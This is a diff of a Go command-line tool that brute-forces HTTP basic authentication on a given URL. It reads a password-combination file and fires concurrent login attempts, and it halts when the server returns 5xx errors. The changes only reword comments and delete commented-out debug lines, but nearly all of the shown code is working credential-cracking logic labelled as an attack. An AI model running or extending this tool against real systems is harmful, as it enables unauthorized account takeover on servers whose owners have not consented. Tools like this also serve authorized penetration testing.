@@ -19,32 +19,29 @@ import (
 var wg sync.WaitGroup
 
 func main() {
-	//Params
+	//Getting arguments
 	url := flag.String("url", "", "url to attack")
 	passListPath := flag.String("plist", "passlist.txt", "path to auth combo file")
-	//debug := flag.Int("debug", -1, "log all status codes")
-	//degug := true
 	timeout := flag.Int("timeout", 10, "set http request timeout in seconds.")
 
 	flag.Parse()
 
 	banner()
 
-	//Checking requirement url.
+	//Checking requirement of the URL.
 	if *url == "" {
 		fmt.Println("")
 		color.Red("*Please define a url to start")
 		os.Exit(1)
 	}
 
-	//Checking requirement pass comobo list. Reading passlist.
+	//Checking requirement of password comobination list. Reading password list.
 	passlistRaw, err := ioutil.ReadFile(*passListPath)
 	if err != nil {
 		panic(err)
 	}
 
 	passList := strings.Split(string(passlistRaw), "\n")
-	//fmt.Println(passList)
 	start := time.Now()
 	crack(*url, passList, *timeout)
 	fmt.Printf("\nfinished cheking %d combos in %v\n", len(passList), time.Since(start))
@@ -52,15 +49,16 @@ func main() {
 }
 
 func crack(url string, passList []string, timeout int) {
-	//banner()
 	fmt.Println("\n[" + url + "] checking url for authentication...")
-	if !check(url) {
-		log.Fatal("No basic authentication response received. please recheck the url.")
+	if !check(url) { //Checking if the src URL is protected by basic access authentication.
+		log.Fatal("No basic authentication response received. please recheck the URL.")
 	}
 	fmt.Printf("["+url+"] cracking with %d authentication combos...", len(passList))
 	fmt.Println("")
+	//Starting the loop
 	for _, rawAuthCombo := range passList {
 		wg.Add(1)
+		//Go routines.
 		go func(rawAuthCombo string) {
 			c := &http.Client{
 				Timeout: time.Second * time.Duration(timeout),
@@ -77,6 +75,7 @@ func crack(url string, passList []string, timeout int) {
 			if err == nil {
 				defer res.Body.Close()
 				if res.StatusCode != 401 {
+					//Checking if the server stressing if it is then stop attacking.
 					if res.StatusCode > 500 {
 						color.Red("Stopping the attack. server is stressing. " + strconv.Itoa(res.StatusCode))
 						os.Exit(1)
